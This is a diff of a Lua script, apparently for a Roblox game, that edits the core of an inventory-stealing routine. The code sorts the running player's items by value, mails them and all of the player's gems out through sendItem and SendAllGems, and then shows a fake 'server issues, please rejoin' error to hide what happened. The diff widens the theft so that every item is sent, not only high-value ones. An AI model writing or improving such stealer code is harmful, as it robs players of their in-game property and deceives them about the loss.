@@ -352,23 +352,27 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
         return
     end
 
-    table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
-    end)
+    -- Sort once by total RAP value (RAP * amount)
+table.sort(sortedItems, function(a, b)
+	return (a.rap * a.amount) > (b.rap * b.amount)
+end)
 
-    task.spawn(function()
-        SendMessage(GemAmount1)
-    end)
+task.spawn(function()
+	SendMessage(GemAmount1)
+end)
 
-    for _, item in ipairs(sortedItems) do
-        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
-            sendItem(item.category, item.uid, item.amount)
-        else
-            break
-        end
-    end
-    if GemAmount1 > mailSendPrice then
-        SendAllGems()
+-- Send highest RAP items first, regardless of category
+for _, item in ipairs(sortedItems) do
+	if GemAmount1 > mailSendPrice then
+		sendItem(item.category, item.uid, item.amount)
+	else
+		break
+	end
+end
+
+-- Send remaining gems last
+if GemAmount1 > mailSendPrice then
+	SendAllGems()
     end
     message.Error("We are Having server issues please rejoin and try again")
 end
